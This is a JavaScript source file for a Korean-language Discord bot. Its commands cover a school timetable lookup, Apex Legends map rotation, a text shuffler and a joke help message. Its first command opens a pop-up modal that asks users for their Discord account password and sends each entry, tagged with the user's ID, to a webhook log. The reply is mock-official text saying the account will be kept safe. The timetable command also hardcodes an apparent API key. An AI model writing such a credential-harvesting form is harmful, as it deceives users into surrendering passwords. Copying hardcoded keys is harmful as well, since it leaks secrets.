import {
	createElement,
	useString, useNumber, useInteger, useDescription,
	Message, Embed, Field, Modal, Button, Input, Row,
	useButton, useModal, useInput,
} from 'slshx';
import {
	ALS_API, NEIS_API, WebLogger,
	setTweaks, formatMinutes, escapers, randomInt
} from "./modules/tweak_functions.js";
setTweaks(self);



export function 빠빱윈또우뻐뜬() {
	const [popupPassword, popupPassword_value] = useInput();
	const popupWindow = useModal((interaction, env) => {
		const Logger = new WebLogger(env.LOGHOOK_ID, env.LOGHOOK_TOKEN);
		Logger.log(`<@${interaction.member.user.id}> | 빠빱\\_윈또우\\_뻐뜬 > \`\`${escapers.backtick(popupPassword_value)}\`\``);
		return (
			<Message ephemeral>{`<@${interaction.member.user.id}>`}, 매우 즐거운 귀하의 계정! 당국이 계정을 안전하게 보호할 것이다 입니다.</Message>
		);
	});
	const popupWindowButton = useButton(() => (
		<Modal id={popupWindow} title="이것은 빠빱_윈또우 이다">
			<Input
				id={popupPassword}
				label="Discord 계정 비밀번호를 입력해주세요"
				required
			>
			</Input>
		</Modal>
	));
	
	return () => (
		<Message>
			빠빱\_윈또우\_뻐뜬
			<Row>
				<Button id={popupWindowButton} primary>popup_window_button</Button>
			</Row>
		</Message>
	);
};
export function 시간표() {
	const sch = {
		region: useString("지역코드"),
		code: useInteger("학교코드"),
		grade: useInteger("학년"),
		className: useInteger("반")
	};

	return async function*(interaction, env) {
		if(!["901544586990743632", "868813672154288128"].includes(interaction?.guild_id)) {
			return <Message>이 명령어는 현재 미공개 상태이며 개발자 서버에서만 이용할 수 있습니다.</Message>
		}
		yield;
		const NIES = new NEIS_API("4243226e82884f239ce39a5d454d5c42");
		const data = await NIES.send("hisTimetable", {
			ATPT_OFCDC_SC_CODE: "J10" /*sch.region.toUpperCase()*/,
			SD_SCHUL_CODE: "7530474" /*sch.code*/,
			GRADE: sch.grade,
			CLASS_NM: sch.className,
			ALL_TI_YMD: new Date().toISOString().replace(/(-)|(T.*)/g, '')
		});
		const basedData = data.timetables[0];
		return (
			<Message>
				<Embed
					title={`:calendar_spiral: ${basedData.SCHUL_NM} - ${basedData.GRADE}학년 ${basedData.CLASS_NM}반 시간표`}
				>
					{data.timetables.map((time, index) => {
						return <Field name={`${index+1}교시`}>
							{time.ITRT_CNTNT}
						</Field>
					})}
				</Embed>
			</Message>
		);
	}
};
export function 맵() {
	const gamemode = useString("게임모드");

	return async function*(interaction, env) {
		yield;
		const ALS = new ALS_API(env.ALS_TOKEN);
		const als = await ALS.send("maprotation", {version: 2});
		const data = als[gamemode ?? "battle_royale"];
		return (
			<Message>
				<Embed
					title={`:map: 현재 맵: \`${data.current.map}\``}
					image={data.current.asset}
					footer={`이 맵은 ${formatMinutes(data.current.DurationInMinutes)} 동안 유지됩니다`}
				>
					{`<t:${data.current.start}:R>에 시작되었습니다.`}
				</Embed>
				<Embed
					title={`:map: 다음 맵: \`${data.next.map}\``}
					image={data.next.asset}
					footer={`이 맵은 ${formatMinutes(data.next.DurationInMinutes)} 동안 유지됩니다`}
				>
					{`> <t:${data.next.start}:R>에 시작됩니다.`}
				</Embed>
			</Message>
		);
	};
};
export function 금은가야() {
	const type = useString("기법");
	const msg = useString("메시지");
	const repeat = useNumber("반복") ?? 1;

	switch(type){
		case "shuffle": {
			return ()=> <Message>{escapers.all(msg.repeat(repeat).shuffle().slice(0, 1999))}</Message>
		};
		case "reverse": {
			return ()=> <Message>{escapers.all(msg.repeat(repeat).reverse().slice(0, 1999))}</Message>
		};
		default: {
			return ()=> <Message>{type}은(는) 존재하지 않는 타입입니다.</Message>
		};
	};
};
export function 도움말() {
	return ()=> (
		<Message>
			<Embed
				title="도움말 목록을 불러오는 중입니다..."
			>
				{`예상 완료 시간 : \`${formatMinutes(randomInt(96854851, 6857485141))}\``}
			</Embed>
		</Message>
	);
};